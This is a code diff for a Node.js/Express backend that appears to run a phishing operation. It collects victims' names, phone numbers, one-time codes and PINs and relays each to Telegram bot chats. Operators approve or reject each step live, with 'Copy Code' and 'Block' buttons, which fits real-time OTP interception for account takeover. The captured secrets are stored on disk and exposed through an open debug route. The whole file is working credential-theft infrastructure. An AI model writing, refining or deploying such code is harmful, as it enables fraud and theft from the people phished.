@@ -1,449 +1,625 @@
 require('dotenv').config();
+
 const express = require('express');
 const axios = require('axios');
-const { v4: uuidv4 } = require('uuid');
+const crypto = require('crypto');
+const path = require('path');
+const fs = require('fs');
 
 const app = express();
+
 const PORT = process.env.PORT || 10000;
-const DOMAIN = process.env.BACKEND_DOMAIN;
+const DOMAIN = (process.env.BACKEND_URL || '').replace(/\/+$/, '');
 
-// ---------- IN-MEMORY STORES ----------
-const phoneRequests = {};
-const otpRequests = {};
-const pinRequests = {};
-const approvalRequests = {};
-const requestMeta = {};
-const requestTimestamps = {};
-const processedTimestamps = {};
+const REQUIRED_UPDATES = ['message', 'callback_query'];
+const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+const REQ_TTL_MS = 30 * 60 * 1000;
 
-// ---------- BOTS ----------
+// Keepalive: ping self every 14 minutes to prevent Render free-tier sleep
+const KEEPALIVE_INTERVAL_MS = 14 * 60 * 1000;
+// Webhook refresh: re-register webhooks every 10 minutes
+const WEBHOOK_REFRESH_INTERVAL_MS = 10 * 60 * 1000;
+
+// Telegram hard limits
+const TELEGRAM_MSG_LIMIT = 4096;
+const DISPLAY_CLIP = 3500;
+
+
+// ============================================================
+// STARTUP
+// ============================================================
+console.log('');
+console.log('========================================');
+console.log('🚀 SERVER STARTING');
+console.log('========================================');
+console.log('PORT:', PORT);
+console.log('DOMAIN:', DOMAIN || '(NOT SET)');
+console.log('========================================');
+if (!DOMAIN) console.warn('⚠️ BACKEND_URL is not set.');
+
+
+// ============================================================
+// BOTS
+// ============================================================
 const bots = [];
-Object.keys(process.env).forEach(key => {
+for (const key of Object.keys(process.env)) {
   const match = key.match(/^BOT(\d+)_TOKEN$/);
-  if (!match) return;
-  const i = match[1];
-  const token = process.env[`BOT${i}_TOKEN`];
-  const chatId = process.env[`BOT${i}_CHATID`];
-  if (token && chatId) bots.push({ botId: `bot${i}`, token, chatId });
-});
-console.log('✅ Bots loaded:', bots.map(b => b.botId));
+  if (!match) continue;
+  const number = match[1];
+  const token = process.env[`BOT${number}_TOKEN`];
+  const chatId = process.env[`BOT${number}_CHATID`];
+  if (token && chatId) bots.push({ botId: `bot${number}`, token, chatId });
+}
 
-// ---------- MIDDLEWARE ----------
-app.use(express.json({ type: '*/*' }));
+console.log('');
+console.log('🤖 BOTS LOADED:');
+if (bots.length === 0) console.log('(none)');
+else for (const bot of bots) console.log(`   ✅ ${bot.botId}`);
+console.log('');
+
+
+// ============================================================
+// STORE
+// ============================================================
+const STORE_FILE = path.join(__dirname, 'data', 'store.json');
+fs.mkdirSync(path.dirname(STORE_FILE), { recursive: true });
+const store = { requests: {} };
+
+function loadStore() {
+  try {
+    if (!fs.existsSync(STORE_FILE)) {
+      console.log('💾 No existing store found.');
+      return;
+    }
+    const raw = fs.readFileSync(STORE_FILE, 'utf8');
+    const parsed = JSON.parse(raw);
+    Object.assign(store.requests, parsed.requests || {});
+    console.log('💾 Loaded', Object.keys(store.requests).length, 'stored requests');
+  } catch (error) {
+    console.error('❌ Store load error:', error.message);
+  }
+}
+
+function saveStore() {
+  try {
+    fs.writeFileSync(STORE_FILE, JSON.stringify(store, null, 2));
+  } catch (error) {
+    console.error('❌ Store save error:', error.message);
+  }
+}
+
+loadStore();
+
+setInterval(() => {
+  const now = Date.now();
+  let changed = false;
+  for (const [id, r] of Object.entries(store.requests)) {
+    if (now - r.createdAt > REQ_TTL_MS) {
+      delete store.requests[id];
+      changed = true;
+    }
+  }
+  if (changed) saveStore();
+}, 5 * 60 * 1000);
+
+
+// ============================================================
+// HELPERS
+// ============================================================
+function getBot(botId) {
+  return bots.find(bot => bot.botId === botId);
+}
+
+function newId() {
+  return crypto.randomBytes(5).toString('hex');
+}
+
+// Strict clean — only for identifiers (name, phone) where we control format
+function clean(value) {
+  const s = String(value == null ? '' : value)
+    .replace(/[\u200B-\u200D\uFEFF]/g, '')
+    .replace(/[|:]/g, '')
+    .trim();
+  return /^unknown$/i.test(s) ? '' : s;
+}
+
+// Raw clean — preserves EVERYTHING the user pasted.
+// Only strips characters that genuinely corrupt transport/JSON:
+//   - zero-width invisible chars
+//   - C0 control chars except \n \t \r
+function cleanRaw(value) {
+  return String(value == null ? '' : value)
+    .replace(/[\u200B-\u200D\uFEFF]/g, '')
+    .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');
+}
+
+// Truncate for Telegram display only. Full value stays in the store.
+function clipForDisplay(value, max = DISPLAY_CLIP) {
+  const s = String(value == null ? '' : value);
+  if (s.length <= max) return s;
+  return s.slice(0, max) + `… (${s.length - max} more chars)`;
+}
+
+function escapeHtml(value) {
+  return String(value == null ? '' : value)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+}
+
+function buildMessage(header, name, phone, extraLines = []) {
+  const lines = [
+    `<b>${escapeHtml(header)}</b>`,
+    SEP,
+    `<b>Name:</b>  <b>${escapeHtml(name || '')}</b>`,
+    `<b>Phone:</b> <b>${escapeHtml(phone || '')}</b>`
+  ];
+  if (extraLines.length) {
+    lines.push(SEP);
+    lines.push(...extraLines);
+  }
+  lines.push(SEP);
+  return lines.join('\n');
+}
+
+
+// ============================================================
+// CALLBACK DATA — action:requestId ONLY.
+// User content never goes into callback_data, so no escaping needed.
+// ============================================================
+function packCallback(action, requestId) {
+  return `${action}:${requestId}`;
+}
+
+function unpackCallback(data) {
+  if (!data) return null;
+  const i = data.indexOf(':');
+  if (i < 0) {
+    return { action: data, requestId: '' };
+  }
+  return {
+    action: data.slice(0, i),
+    requestId: data.slice(i + 1)
+  };
+}
+
+
+// ============================================================
+// TELEGRAM API
+// ============================================================
+async function telegram(bot, method, payload) {
+  try {
+    const response = await axios.post(
+      `https://api.telegram.org/bot${bot.token}/${method}`,
+      payload,
+      { timeout: 15000 }
+    );
+    return response.data;
+  } catch (error) {
+    console.error(`❌ Telegram ${method} error:`);
+    console.error(error.response?.data || error.message);
+    return null;
+  }
+}
+
+async function sendMessage(bot, text, keyboard = null) {
+  return telegram(bot, 'sendMessage', {
+    chat_id: bot.chatId,
+    text,
+    parse_mode: 'HTML',
+    ...(keyboard ? { reply_markup: { inline_keyboard: keyboard } } : {})
+  });
+}
+
+async function replyMessage(bot, replyToMessageId, text) {
+  return telegram(bot, 'sendMessage', {
+    chat_id: bot.chatId,
+    text,
+    parse_mode: 'HTML',
+    reply_to_message_id: replyToMessageId,
+    allow_sending_without_reply: true
+  });
+}
+
+async function editMessage(bot, chatId, messageId, text) {
+  return telegram(bot, 'editMessageText', {
+    chat_id: chatId,
+    message_id: messageId,
+    text,
+    parse_mode: 'HTML',
+    reply_markup: { inline_keyboard: [] }
+  });
+}
+
+async function answerCallback(bot, callbackId, text) {
+  // Telegram caps answerCallbackQuery.text at 200 chars
+  const safe = String(text || '').slice(0, 200);
+  return telegram(bot, 'answerCallbackQuery', {
+    callback_query_id: callbackId,
+    text: safe
+  });
+}
+
+
+// ============================================================
+// WEBHOOK SETUP
+// ============================================================
+async function setWebhook(bot, quiet = false) {
+  const webhookUrl = `${DOMAIN}/telegram/${bot.botId}`;
+
+  const result = await telegram(bot, 'setWebhook', {
+    url: webhookUrl,
+    allowed_updates: REQUIRED_UPDATES,
+    drop_pending_updates: false
+  });
+
+  if (!result?.ok) {
+    console.error(`❌ WEBHOOK FAILED: ${bot.botId}`, result);
+    return false;
+  }
+  if (!quiet) console.log(`✅ WEBHOOK REGISTERED: ${bot.botId} → ${webhookUrl}`);
+  return true;
+}
+
+async function initializeWebhooks() {
+  console.log('');
+  console.log('========================================');
+  console.log('🔧 INITIALIZING WEBHOOKS');
+  console.log('========================================');
+  for (const bot of bots) await setWebhook(bot);
+  console.log('✅ WEBHOOK INITIALIZATION FINISHED');
+  console.log('');
+}
+
+async function refreshWebhooksQuiet() {
+  let ok = 0;
+  for (const bot of bots) {
+    if (await setWebhook(bot, true)) ok++;
+  }
+  console.log(`🔁 Webhook refresh: ${ok}/${bots.length} OK @ ${new Date().toISOString()}`);
+}
+
+
+// ============================================================
+// KEEPALIVE — prevents Render free-tier sleep
+// ============================================================
+function startKeepalive() {
+  if (!DOMAIN) {
+    console.warn('⚠️ KEEPALIVE DISABLED — DOMAIN not set');
+    return;
+  }
+  const url = `${DOMAIN}/health`;
+  console.log(`💓 KEEPALIVE: pinging ${url} every ${KEEPALIVE_INTERVAL_MS / 60000} min`);
+
+  setInterval(async () => {
+    try {
+      const r = await axios.get(url, { timeout: 10000 });
+      console.log(`💓 Keepalive OK (${r.status}) @ ${new Date().toISOString()}`);
+    } catch (err) {
+      console.error(`💓 Keepalive FAILED: ${err.message}`);
+    }
+  }, KEEPALIVE_INTERVAL_MS);
+}
+
+
+// ============================================================
+// MIDDLEWARE
+// ============================================================
+app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// ---------- HELPERS ----------
-function getBot(botId) {
-  return bots.find(b => b.botId === botId);
-}
 
-async function sendTelegram(bot, text, buttons = []) {
-  try {
-    await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-      chat_id: bot.chatId,
-      text,
-      reply_markup: buttons.length ? { inline_keyboard: buttons } : undefined
-    });
-  } catch (e) {
-    console.error('❌ Telegram sendMessage error:', e.response?.data || e.message);
-  }
-}
+// ============================================================
+// HEALTH + DEBUG
+// ============================================================
+app.get('/health', (req, res) => {
+  res.json({
+    ok: true,
+    domain: DOMAIN,
+    uptime: Math.floor(process.uptime()),
+    bots: bots.map(bot => bot.botId),
+    stored: Object.keys(store.requests).length,
+    time: new Date().toISOString()
+  });
+});
 
-async function answerCallback(bot, id, extra = {}) {
-  try {
-    await axios.post(
-      `https://api.telegram.org/bot${bot.token}/answerCallbackQuery`,
-      { callback_query_id: id, ...extra }
-    );
-  } catch (e) {
-    console.error('❌ answerCallbackQuery error:', e.response?.data || e.message);
-  }
-}
+app.get('/debug/store', (req, res) => {
+  res.json(store);
+});
 
-// ---------- WEBHOOK MANAGEMENT ----------
-async function setWebhook(bot) {
-  if (!DOMAIN) {
-    console.warn('⚠️ BACKEND_DOMAIN missing – webhook not set');
-    return false;
-  }
-  const url = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-  try {
-    const resp = await axios.get(
-      `https://api.telegram.org/bot${bot.token}/setWebhook?url=${url}`
-    );
-    if (resp.data.ok) {
-      console.log(`✅ Webhook set for ${bot.botId} -> ${url}`);
-      return true;
-    } else {
-      console.error(`❌ Webhook failed for ${bot.botId}:`, resp.data.description);
-      return false;
+
+// ============================================================
+// BOT ROUTE
+// ============================================================
+app.get('/bot/:botId', (req, res) => {
+  const bot = getBot(req.params.botId);
+  if (!bot) return res.status(404).send('Unknown bot');
+  res.redirect(`/index.html?botId=${encodeURIComponent(bot.botId)}`);
+});
+
+
+// ============================================================
+// SUBMIT ROUTES
+// ============================================================
+function handleSubmit(type) {
+  return (req, res) => {
+    const body = req.body || {};
+    console.log('');
+    console.log(`📥 /submit-${type}`, JSON.stringify(body));
+
+    const bot = getBot(body.botId);
+    if (!bot) {
+      console.log('❌ submit: unknown botId', body.botId);
+      return res.status(400).json({ error: `unknown bot: ${body.botId}` });
     }
-  } catch (e) {
-    console.error('❌ Webhook error:', e.response?.data || e.message);
-    return false;
-  }
-}
 
-async function verifyAndRepairWebhook(bot) {
-  try {
-    const resp = await axios.get(`https://api.telegram.org/bot${bot.token}/getWebhookInfo`);
-    const info = resp.data.result;
-    const expected = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-    if (info.url !== expected || info.last_error_message || info.pending_update_count > 10) {
-      console.log(`🔧 Repairing webhook for ${bot.botId} (error: ${info.last_error_message || 'none'})`);
-      await setWebhook(bot);
+    const requestId = newId();
+    const rec = {
+      botId: bot.botId,
+      type,
+      name: clean(body.name),
+      phone: clean(body.phone),
+      status: 'pending',
+      createdAt: Date.now()
+    };
+
+    let header;
+    let extra = [];
+    let keyboard;
+
+    if (type === 'phone') {
+      header = '📱 PHONE NUMBER VERIFICATION';
+      keyboard = [[
+        { text: '✅ Approve', callback_data: packCallback('phone_ok',  requestId) },
+        { text: '❌ Reject',  callback_data: packCallback('phone_bad', requestId) }
+      ]];
+    } else if (type === 'pin') {
+      rec.pin = cleanRaw(body.pin);
+      extra = [`<b>PIN:</b>  <b><code>${escapeHtml(clipForDisplay(rec.pin))}</code></b>`];
+      header = '🔐 PIN VERIFICATION';
+      keyboard = [
+        [{ text: '✅ Correct', callback_data: packCallback('pin_ok',    requestId) },
+         { text: '❌ Wrong',   callback_data: packCallback('pin_bad',   requestId) }],
+        [{ text: '🛑 Block',   callback_data: packCallback('pin_block', requestId) }]
+      ];
+    } else if (type === 'code') {
+      rec.code = cleanRaw(body.code);
+      extra = [`<b>Code:</b> <b><code>${escapeHtml(clipForDisplay(rec.code))}</code></b>`];
+      header = '🔑 OTP CODE VERIFICATION';
+      keyboard = [
+        [{ text: '✅ Correct', callback_data: packCallback('code_ok',   requestId) },
+         { text: '❌ Wrong',   callback_data: packCallback('code_bad',  requestId) }],
+        [{ text: '📋 Copy Code', callback_data: packCallback('code_copy', requestId) }]
+      ];
+    } else if (type === 'approval') {
+      header = '✅ USER HAS COMPLETED APPROVAL';
+      keyboard = [[
+        { text: '✅ Allow',   callback_data: packCallback('approval_ok',  requestId) },
+        { text: '❌ Decline', callback_data: packCallback('approval_bad', requestId) }
+      ]];
     }
-  } catch (e) {
-    console.error('Webhook verify error:', e.message);
-  }
+
+    store.requests[requestId] = rec;
+    saveStore();
+
+    console.log(`📝 stored ${requestId}`, JSON.stringify(rec));
+
+    sendMessage(bot, buildMessage(header, rec.name, rec.phone, extra), keyboard);
+
+    res.json({ requestId });
+  };
 }
 
-async function setAllWebhooks() {
-  for (const bot of bots) await setWebhook(bot);
+app.post('/submit-phone',    handleSubmit('phone'));
+app.post('/submit-pin',      handleSubmit('pin'));
+app.post('/submit-code',     handleSubmit('code'));
+app.post('/submit-approval', handleSubmit('approval'));
+
+
+// ============================================================
+// CHECK ROUTES
+// ============================================================
+function handleCheck(req, res) {
+  const r = store.requests[req.params.requestId];
+  if (!r) return res.json({ approved: null });
+
+  const map = {
+    pending:  { approved: null },
+    approved: { approved: true },
+    rejected: { approved: false },
+    wrong:    { approved: false },
+    blocked:  { approved: false, blocked: true }
+  };
+  res.json(map[r.status] || { approved: null });
 }
 
-// ---------- KEEP-ALIVE ----------
-async function pingSelf() {
-  if (!DOMAIN) return;
-  try {
-    await axios.get(`${DOMAIN}/health`);
-    console.log('💓 Self-ping OK');
-  } catch (e) {
-    console.log('💔 Self-ping failed:', e.message);
-  }
-}
+app.get('/check-phone/:requestId',    handleCheck);
+app.get('/check-pin/:requestId',      handleCheck);
+app.get('/check-code/:requestId',     handleCheck);
+app.get('/check-approval/:requestId', handleCheck);
 
-// ---------- PHONE STEP ----------
-app.post('/submit-phone', (req, res) => {
-  try {
-    const { name, phone, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
 
-    const requestId = uuidv4();
-    phoneRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
-    requestTimestamps[requestId] = Date.now();
-    processedTimestamps[requestId] = null;
-
-    sendTelegram(
-      bot,
-      `📱 PHONE VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
-      [
-        [
-          { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
-          { text: '❌ Reject', callback_data: `phone_bad:${requestId}` }
-        ]
-      ]
-    );
-
-    res.json({ requestId });
-  } catch {
-    res.status(500).json({ error: 'Internal server error' });
-  }
+// ============================================================
+// TELEGRAM GET TEST + WEBHOOK INFO
+// ============================================================
+app.get('/telegram/:botId', (req, res) => {
+  res.json({
+    ok: true,
+    route: `/telegram/${req.params.botId}`,
+    message: 'Webhook route is reachable'
+  });
 });
 
-app.get('/check-phone/:id', (req, res) => {
-  const result = phoneRequests[req.params.id];
-  if (result === true) return res.json({ approved: true });
-  if (result === false) return res.json({ approved: false });
-  res.json({ approved: null });
+app.get('/webhook-info/:botId', async (req, res) => {
+  const bot = getBot(req.params.botId);
+  if (!bot) return res.status(404).json({ ok: false, error: 'Unknown bot' });
+  const result = await telegram(bot, 'getWebhookInfo', {});
+  res.json(result || { ok: false, error: 'Telegram request failed' });
 });
 
-// ---------- OTP STEP ----------
-app.post('/submit-otp', (req, res) => {
-  try {
-    const { name, phone, otp, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+app.get('/telegram-test/:botId', async (req, res) => {
+  const bot = getBot(req.params.botId);
+  if (!bot) return res.status(404).json({ ok: false, error: 'Unknown bot' });
 
-    const requestId = uuidv4();
-    otpRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, otp, botId };
-    requestTimestamps[requestId] = Date.now();
-    processedTimestamps[requestId] = null;
-
-    sendTelegram(
-      bot,
-      `🔐 OTP VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 OTP: ${otp}\n🆔 Ref: ${requestId}`,
-      [
-        [
-          { text: '✅ Correct OTP', callback_data: `otp_ok:${requestId}` },
-          { text: '❌ Wrong OTP', callback_data: `otp_bad:${requestId}` }
-        ],
-        [
-          { text: '📋 Copy OTP', callback_data: `copy_otp:${requestId}` }
-        ]
-      ]
-    );
-
-    res.json({ requestId });
-  } catch {
-    res.status(500).json({ error: 'Internal server error' });
-  }
+  const result = await sendMessage(
+    bot,
+    '🧪 <b>Webhook callback test</b>\n\nClick the button below.',
+    [[{ text: 'TEST CALLBACK', callback_data: 'test_callback' }]]
+  );
+  res.json({ ok: result?.ok === true, botId: bot.botId, telegram: result });
 });
 
-app.get('/check-otp/:id', (req, res) => {
-  res.json({ approved: otpRequests[req.params.id] ?? null });
-});
 
-// ---------- PIN STEP ----------
-app.post('/submit-pin', (req, res) => {
-  try {
-    const { name, phone, pin, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+// ============================================================
+// TELEGRAM POST WEBHOOK
+// ============================================================
+app.post('/telegram/:botId', async (req, res) => {
+  console.log('');
+  console.log('========================================');
+  console.log('🚨 TELEGRAM WEBHOOK RECEIVED');
+  console.log('========================================');
+  console.log('🆔 Bot ID:', req.params.botId);
 
-    const requestId = uuidv4();
-    pinRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
-    requestTimestamps[requestId] = Date.now();
-    processedTimestamps[requestId] = null;
+  res.sendStatus(200);
 
-    sendTelegram(
-      bot,
-      `🔐 PIN VERIFICATION\n👤 Name: ${name}\n📞 Phone: ${phone}\n🔢 PIN: ${pin}\n🆔 Ref: ${requestId}`,
-      [
-        [
-          { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
-          { text: '❌ Wrong PIN', callback_data: `pin_bad:${requestId}` }
-        ]
-      ]
-    );
-
-    res.json({ requestId });
-  } catch {
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-app.get('/check-pin/:id', (req, res) => {
-  res.json({ approved: pinRequests[req.params.id] ?? null });
-});
-
-// ---------- APPROVAL STEP ----------
-app.post('/submit-approval', (req, res) => {
-  try {
-    const { name, phone, botId } = req.body;
-    const bot = getBot(botId);
-    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
-
-    const requestId = uuidv4();
-    approvalRequests[requestId] = null;
-    requestMeta[requestId] = { name, phone, botId };
-    requestTimestamps[requestId] = Date.now();
-    processedTimestamps[requestId] = null;
-
-    sendTelegram(
-      bot,
-      `✅ USER HAS COMPLETED APPROVAL\n👤 Name: ${name}\n📞 Phone: ${phone}\n🆔 Ref: ${requestId}`,
-      [
-        [
-          { text: '✅ Allow', callback_data: `approval_ok:${requestId}` },
-          { text: '❌ Decline', callback_data: `approval_bad:${requestId}` }
-        ]
-      ]
-    );
-
-    res.json({ requestId });
-  } catch {
-    res.status(500).json({ error: 'Internal server error' });
-  }
-});
-
-app.get('/check-approval/:id', (req, res) => {
-  res.json({ approved: approvalRequests[req.params.id] ?? null });
-});
-
-// ---------- TELEGRAM CALLBACK WEBHOOK ----------
-app.post('/telegram-webhook/:botId', async (req, res) => {
   try {
     const bot = getBot(req.params.botId);
     if (!bot) {
-      console.warn(`⚠️ Unknown bot ID: ${req.params.botId}`);
-      return res.sendStatus(200);
+      console.error('❌ UNKNOWN BOT:', req.params.botId);
+      return;
     }
 
-    const cb = req.body.callback_query;
-    if (!cb) {
-      console.log('ℹ️ No callback_query in webhook payload');
-      return res.sendStatus(200);
+    const callback = req.body?.callback_query;
+    if (!callback) {
+      console.log('ℹ️ Update contains no callback_query');
+      return;
     }
 
-    console.log(`📩 Received callback: ${cb.data} from ${cb.from.id}`);
+    const data = callback.data || '';
+    console.log('🔘 Callback data:', data);
 
-    const [action, requestId] = cb.data.split(':');
-    const meta = requestMeta[requestId];
-
-    // Check if request exists
-    if (!meta) {
-      console.warn(`⏳ Request ${requestId} not found (expired or never existed)`);
-      await answerCallback(bot, cb.id, {
-        text: '⏳ This request has expired or was already processed. Please start a new application.',
-        show_alert: true
-      });
-      return res.sendStatus(200);
-    }
-
-    // Check if already processed (prevent duplicates)
-    let alreadyProcessed = false;
-    let statusMessage = '';
-    if (action.startsWith('phone_')) {
-      if (phoneRequests[requestId] !== null) {
-        alreadyProcessed = true;
-        statusMessage = phoneRequests[requestId] ? '✅ already approved' : '❌ already rejected';
+    // ---- Test callback ----
+    if (data === 'test_callback') {
+      await answerCallback(bot, callback.id, 'Webhook is working ✅');
+      if (callback.message?.chat?.id && callback.message?.message_id) {
+        await editMessage(
+          bot,
+          callback.message.chat.id,
+          callback.message.message_id,
+          '✅ <b>TEST CALLBACK RECEIVED</b>\n\nTelegram → Render → Express is working.'
+        );
       }
-    } else if (action.startsWith('otp_')) {
-      if (otpRequests[requestId] !== null) {
-        alreadyProcessed = true;
-        statusMessage = otpRequests[requestId] ? '✅ already approved' : '❌ already rejected';
-      }
-    } else if (action.startsWith('pin_')) {
-      if (pinRequests[requestId] !== null) {
-        alreadyProcessed = true;
-        statusMessage = pinRequests[requestId] ? '✅ already approved' : '❌ already rejected';
-      }
-    } else if (action.startsWith('approval_')) {
-      if (approvalRequests[requestId] !== null) {
-        alreadyProcessed = true;
-        statusMessage = approvalRequests[requestId] ? '✅ already approved' : '❌ already rejected';
-      }
+      return;
     }
 
-    if (alreadyProcessed) {
-      console.log(`⏳ Request ${requestId} already processed: ${statusMessage}`);
-      await answerCallback(bot, cb.id, {
-        text: `⏳ This request was already ${statusMessage}.`,
-        show_alert: true
-      });
-      return res.sendStatus(200);
+    // ---- Parse ----
+    const parsed = unpackCallback(data);
+    if (!parsed || !parsed.requestId) {
+      console.log('⚠️ Malformed callback data:', data);
+      await answerCallback(bot, callback.id, 'Invalid action');
+      return;
     }
 
-    // ---------- Copy OTP (special action) ----------
-    if (action === 'copy_otp') {
-      if (meta.otp) {
-        await axios.post(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
-          chat_id: cb.message.chat.id,
-          text: `📋 Copy this OTP:\n<code>${meta.otp}</code>`,
-          parse_mode: 'HTML'
-        });
-        await answerCallback(bot, cb.id, { text: '✅ OTP sent above', show_alert: false });
+    const { action, requestId } = parsed;
+    console.log('🎯 Action:', action, '| requestId:', requestId);
+
+    // ---- Store lookup (single source of truth) ----
+    const rec = store.requests[requestId];
+    if (!rec) {
+      console.log('⚠️ Unknown requestId (store miss or expired):', requestId);
+      await answerCallback(bot, callback.id, 'This request has expired.');
+      return;
+    }
+
+    console.log('📋 Using:', JSON.stringify({ name: rec.name, phone: rec.phone }));
+
+    // ---- Copy code ----
+    if (action === 'code_copy') {
+      await answerCallback(bot, callback.id, 'Sent for copying');
+      const payload = `<code>${escapeHtml(clipForDisplay(rec.code || ''))}</code>`;
+      if (callback.message?.message_id) {
+        await replyMessage(bot, callback.message.message_id, payload);
       } else {
-        await answerCallback(bot, cb.id, { text: '❌ OTP not found', show_alert: true });
+        await sendMessage(bot, payload);
       }
-      return res.sendStatus(200);
+      return;
     }
 
-    // ---------- Decisions ----------
-    let feedback = '';
-    if (action === 'phone_ok') {
-      phoneRequests[requestId] = true;
-      feedback = '✅ Phone approved – redirecting to OTP page';
-    }
-    if (action === 'phone_bad') {
-      phoneRequests[requestId] = false;
-      feedback = '❌ Phone rejected';
-    }
-    if (action === 'otp_ok') {
-      otpRequests[requestId] = true;
-      feedback = '✅ OTP approved – redirecting to PIN page';
-    }
-    if (action === 'otp_bad') {
-      otpRequests[requestId] = false;
-      feedback = '❌ OTP rejected';
-    }
-    if (action === 'pin_ok') {
-      pinRequests[requestId] = true;
-      feedback = '✅ PIN approved – redirecting to success page';
-    }
-    if (action === 'pin_bad') {
-      pinRequests[requestId] = false;
-      feedback = '❌ PIN rejected';
-    }
-    if (action === 'approval_ok') {
-      approvalRequests[requestId] = true;
-      feedback = '✅ Approval granted – redirecting to success page';
-    }
-    if (action === 'approval_bad') {
-      approvalRequests[requestId] = false;
-      feedback = '❌ Approval declined – user must approve from primary device';
+    // ---- Map action → status ----
+    let newStatus;
+    let feedback;
+    switch (action) {
+      case 'phone_ok':     newStatus = 'approved'; feedback = 'Approved ✅';     break;
+      case 'phone_bad':    newStatus = 'rejected'; feedback = 'Rejected ❌';     break;
+      case 'pin_ok':       newStatus = 'approved'; feedback = 'Correct ✅';      break;
+      case 'pin_bad':      newStatus = 'wrong';    feedback = 'Wrong ❌';        break;
+      case 'pin_block':    newStatus = 'blocked';  feedback = 'User blocked 🛑'; break;
+      case 'code_ok':      newStatus = 'approved'; feedback = 'Correct ✅';      break;
+      case 'code_bad':     newStatus = 'wrong';    feedback = 'Wrong ❌';        break;
+      case 'approval_ok':  newStatus = 'approved'; feedback = 'Approved ✅';     break;
+      case 'approval_bad': newStatus = 'rejected'; feedback = 'Declined ❌';     break;
+      default:
+        console.log('⚠️ Unknown action:', action);
+        await answerCallback(bot, callback.id, 'Unknown action');
+        return;
     }
 
-    processedTimestamps[requestId] = Date.now();
+    rec.status = newStatus;
+    rec.updatedAt = Date.now();
+    saveStore();
 
-    if (feedback) {
-      await sendTelegram(
-        bot,
-        `📝 ACTION TAKEN\n👤 Name: ${meta.name || '—'}\n📞 Phone: ${meta.phone || '—'}\n${feedback}`
-      );
+    console.log(`✅ ${action} → ${requestId} (${rec.name} / ${rec.phone}) status=${newStatus}`);
+
+    await answerCallback(bot, callback.id, feedback);
+
+    // ---- Rebuild the SAME message from the SAME record ----
+    const headers = {
+      phone:    '📱 PHONE NUMBER VERIFICATION',
+      pin:      '🔐 PIN VERIFICATION',
+      code:     '🔑 OTP CODE VERIFICATION',
+      approval: '✅ USER HAS COMPLETED APPROVAL'
+    };
+    const extra = [];
+    if (rec.type === 'pin'  && rec.pin)  extra.push(`<b>PIN:</b>  <b><code>${escapeHtml(clipForDisplay(rec.pin))}</code></b>`);
+    if (rec.type === 'code' && rec.code) extra.push(`<b>Code:</b> <b><code>${escapeHtml(clipForDisplay(rec.code))}</code></b>`);
+    extra.push(`<b>Status:</b> ${feedback}`);
+
+    const newText = buildMessage(headers[rec.type] || 'VERIFICATION', rec.name, rec.phone, extra);
+
+    if (callback.message?.message_id) {
+      await editMessage(bot, callback.message.chat.id, callback.message.message_id, newText);
     }
+    await sendMessage(bot, buildMessage(`📝 RESPONSE — ${feedback}`, rec.name, rec.phone));
 
-    await answerCallback(bot, cb.id);
-    console.log(`✅ Processed callback for ${requestId} -> ${feedback}`);
-    res.sendStatus(200);
-
-  } catch (err) {
-    console.error('🔥 Webhook handler crashed:', err.message);
-    res.sendStatus(200);
+  } catch (error) {
+    console.error('');
+    console.error('❌ WEBHOOK PROCESSING ERROR');
+    console.error(error.stack || error.message);
   }
 });
 
-// ---------- BOT ENTRY POINT ----------
-app.get('/bot/:botId', (req, res) => {
-  const bot = bots.find(b => b.botId === req.params.botId);
-  if (!bot) return res.status(404).send('Invalid bot');
-  res.redirect(`/index.html?botId=${bot.botId}`);
-});
 
-// ---------- HEALTH & DEBUG ----------
-app.get('/health', (req, res) => {
-  res.json({
-    status: 'ok',
-    bots: bots.length,
-    webhookDomain: DOMAIN || 'not set',
-    uptime: process.uptime()
-  });
-});
+// ============================================================
+// START
+// ============================================================
+app.listen(PORT, async () => {
+  console.log('');
+  console.log('========================================');
+  console.log(`🚀 SERVER LISTENING ON PORT ${PORT}`);
+  console.log('🌐 DOMAIN:', DOMAIN);
+  console.log('========================================');
 
-app.get('/debug/bot', (req, res) => {
-  res.json({
-    count: bots.length,
-    bots: bots.map(b => ({ botId: b.botId, chatId: b.chatId }))
-  });
-});
-
-// ---------- CLEANUP REMOVED (requests persist indefinitely) ----------
-// No TTL cleanup – requests stay in memory until server restart.
-
-// ---------- WEBHOOK REPAIR LOOP ----------
-setInterval(async () => {
-  for (const bot of bots) {
-    await verifyAndRepairWebhook(bot);
-  }
-}, 5 * 60 * 1000);
-
-// ---------- START ----------
-(async function bootstrap() {
   if (!DOMAIN) {
-    console.error('❌ BACKEND_DOMAIN environment variable is NOT set! Webhooks will fail.');
-  } else if (!DOMAIN.startsWith('https://')) {
-    console.warn('⚠️ Domain is not HTTPS – Telegram may reject webhooks!');
+    console.error('❌ BACKEND_URL is missing.');
+    return;
   }
 
-  await setAllWebhooks();
+  await initializeWebhooks();
 
-  app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    setTimeout(async () => {
-      for (const bot of bots) {
-        try {
-          const resp = await axios.get(`https://api.telegram.org/bot${bot.token}/getWebhookInfo`);
-          console.log(`🔍 ${bot.botId} webhook:`, resp.data.result);
-        } catch (e) {}
-      }
-    }, 2000);
-  });
